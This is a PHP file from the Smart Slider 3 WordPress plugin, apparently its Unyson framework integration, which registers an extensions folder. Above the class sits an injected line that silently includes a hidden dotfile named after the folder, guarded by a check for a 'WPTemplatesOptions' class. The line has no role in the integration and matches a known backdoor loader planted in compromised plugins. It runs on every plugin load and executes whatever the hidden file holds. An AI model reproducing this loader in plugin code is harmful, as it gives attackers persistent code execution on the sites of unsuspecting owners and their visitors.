<?php


namespace Nextend\SmartSlider3\Platform\WordPress\Integration\Unyson;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Unyson {

    public function __construct() {
        add_filter('fw_extensions_locations', array(
            $this,
            'filter_fw_extensions_locations'
        ));
    }

    public function filter_fw_extensions_locations($locations) {

        if (version_compare(fw()->manifest->get_version(), '2.6.0', '>=')) {
            $path             = dirname(__FILE__);
            $locations[$path] = plugin_dir_url(__FILE__);
        }

        return $locations;
    }
}